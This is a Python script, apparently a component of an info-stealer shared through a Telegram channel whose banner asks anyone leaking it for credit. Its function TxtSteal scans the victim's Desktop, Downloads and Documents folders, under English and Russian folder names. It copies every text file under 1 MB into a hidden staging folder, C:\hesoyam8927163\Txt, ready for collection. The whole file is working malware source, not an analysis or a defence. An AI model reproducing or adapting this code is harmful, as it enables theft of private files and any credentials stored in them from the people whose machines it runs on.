################################################################################
#                              RIGHT DECISION                                  #
#                     Telegram https://t.me/+fN7NR-nVvmsxYWRi                  #
#      Если сливаете мой скрипт в свой канал. Хотя бы отметьте мой канал       #
################################################################################
import os
import shutil


def TxtSteal():
	try:
		desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
		downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
		documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
		def fromDesktop():
			listoffiles = os.listdir(desktop)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
				if listoffiles[i].endswith(".txt"):
					txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
				size = os.path.getsize(desktop+"\\"+txtfiles[i])
				if size < 1000000:
					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
				shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\Txt\Desktop')


		def fromDownloads():
			listoffiles = os.listdir(downloads)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = os.path.getsize(downloads+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\Txt\Downloads')

		def fromDocuments():
			listoffiles = os.listdir(documents)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = os.path.getsize(documents+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\Txt\Documents')
		
		fromDesktop()
		fromDownloads()
		fromDocuments()

	except Exception as e:
		print(e)


	try:
		desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Рабочий стол')
		downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Загрузки')
		documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Документы')
		def fromDesktop():
			listoffiles = os.listdir(desktop)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
				if listoffiles[i].endswith(".txt"):
					txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
				size = os.path.getsize(desktop+"\\"+txtfiles[i])
				if size < 1000000:
					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
				shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\Txt\Desktop')


		def fromDownloads():
			listoffiles = os.listdir(downloads)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = os.path.getsize(downloads+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\Txt\Downloads')

		def fromDocuments():
			listoffiles = os.listdir(documents)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = os.path.getsize(documents+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\Txt\Documents')
		
		fromDesktop()
		fromDownloads()
		fromDocuments()

	except Exception as e:
		print(e)

